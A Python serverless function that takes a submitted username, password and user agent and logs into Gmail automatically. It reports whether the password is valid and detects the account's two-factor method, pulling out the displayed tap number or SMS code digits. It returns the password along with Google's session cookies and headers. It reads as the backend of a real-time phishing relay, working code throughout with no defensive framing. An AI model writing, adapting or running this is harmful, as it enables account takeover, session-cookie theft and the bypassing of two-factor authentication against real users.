import urllib.request
import datetime
import mechanicalsoup
import bs4
import re
import json


def lambda_handler(event, context=None):
	if isinstance(event,dict):
		return google_authenticate(event['username'], event['password'], event['useragent'])
	else:
		request_json = event.get_json(silent=True)
		request_args = event.args
		if request_json and 'username' in request_json:
			username = request_json['username']
			password = request_json['password']
			useragent = request_json['useragent']
			return json.dumps(google_authenticate(username, password, useragent))
		elif request_args and 'username' in request_args:
			username = request_args['username']
			password = request_args['password']
			useragent = request_args['useragent']
			return json.dumps(google_authenticate(username, password, useragent))
		else:
			return f'Error'


def google_authenticate(username, password, useragent):
	ts = datetime.datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')

	data_response = {
		'timestamp': ts,
		'username': username,
		'password': password,
		'success': False,
		'change': False,
		'2fa_enabled': False,
		'type': None,
		'code': None,
		'name': None,
		'action': None,
		'headers': [],
		'cookies': [],
	}
		
	try:
		browser = mechanicalsoup.StatefulBrowser(
			soup_config={'features': 'html'},
			raise_on_404=True,
			user_agent=useragent,
		)

		page = browser.open('https://www.gmail.com')

		user_form = browser.select_form('form')
		user_form.set('Email', username)
		user_response = browser.submit(user_form, page.url)

		pass_form = mechanicalsoup.Form(user_response.soup.form)
		pass_form.set('Passwd', password)
		pass_response = browser.submit(pass_form, page.url)

		raw_headers = pass_response.headers
		soup = pass_response.soup
		raw = soup.text

		sms = soup.find('input', {'id': 'idvPreregisteredPhonePin'})
		sms_old = soup.find('button', {'id': 'idvPreresteredPhoneSms'})
		u2f = soup.find('input', {'id': 'id-challenge'})
		touch = soup.find('input', {'id': 'authzenToken'})
		authenticator = soup.find('input', {'id': 'totpPin'})
		backup = soup.find('input', {'id': 'backupCodePin'})

		if 'Wrong password. Try again.' in raw:
			data_response['success'] = False
		elif 'Loading {}'.format(username) in raw:
			data_response['success'] = True

		if 'you need to change your password' in raw:
			data_response['change'] = True
			data_response['success'] = True

		if sms or sms_old:
			data_response['type'] = 'sms'
			data_response['2fa_enabled'] = True
			data_response['success'] = True

			if sms_old:
				final_form = mechanicalsoup.Form(pass_response.soup.form)
				final_response = browser.submit(final_form, page.url)
				raw_headers = final_response.headers
				raw = final_response.soup.text
				data_response['type'] = 'u2f'

			code = ''
			regexes = [
				r"\d{2}(?=</b>)",
				r"(?<=\u2022)\d{2}(?=G)",
				r"\d{2}(?=G)",
				r"\d{2}(?=\</b>)",
				r"\d{2}(?=S)",
			]
			for regex in regexes:
				matches = re.search(regex, raw, re.UNICODE)
				if matches:
					code = matches.group()
					break
				else:
					code = '**'

			data_response['code'] = code
		elif u2f:
			data_response['type'] = 'u2f'
			data_response['2fa_enabled'] = True
			data_response['success'] = True
		elif touch:
			code = ''
			name = ''
			regex_codes = [
				r"(?<=<b>)\d{1,3}(?=</b>)",
				r"(?<=then tap )\d{1,3}(?= on your phone)"
			]
			for regex_code in regex_codes:
				code_match = re.search(regex_code, raw)
				if code_match:
					code = code_match.group()
				else:
					code = 0

			regex_names = [
				r"(?<=Unlock your ).*(?=Tap)",
				r"(?<=Check your ).*(?=<\/h2>)",
			]
			for regex_name in regex_names:
				name_match = re.search(regex_name, raw)
				if name_match:
					name = name_match.group()
				else:
					name = 'phone'

			data_response['code'] = code
			data_response['name'] = name
			data_response['type'] = 'touchscreen'
			data_response['2fa_enabled'] = True
			data_response['success'] = True
		elif authenticator:
			name = ''
			regexes = [
				r"(?<=Get a verification code from the <strong>).*(?=<\/strong>)",
				r"(?<=Get a verification code from the ).*(?= app)",
			]
			for regex in regexes:
				name_match = re.search(regex, raw, re.UNICODE)
				if name_match:
					name = name_match.group()
				else:
					name = 'authenticator app'

			data_response['name'] = name
			data_response['type'] = 'authenticator'
			data_response['2fa_enabled'] = True
			data_response['success'] = True
		elif backup:
			data_response['type'] = 'backup'
			data_response['2fa_enabled'] = True
			data_response['success'] = True
		else:
			if 'Try again in a few hours' in raw:
				data_response['error'] ='locked out'
			data_response['action'] = 'redirect'

		cookies = []
		for c in browser.get_cookiejar():
			cookie = {}
			cookie['name'] = c.name
			cookie['value'] = c.value
			cookie['domain'] = c.domain
			cookie['path'] = c.path
			cookie['secure'] = c.secure
			cookie['expires'] = c.expires
			cookies.append(cookie)

		data_response['cookies'] = cookies

		for h in raw_headers:
			header = {}
			header['name'] = h
			header['value'] = raw_headers[h]
			data_response['headers'].append(header)

	except Exception as ex:
		data_response['error'] = ex
		pass

	return data_response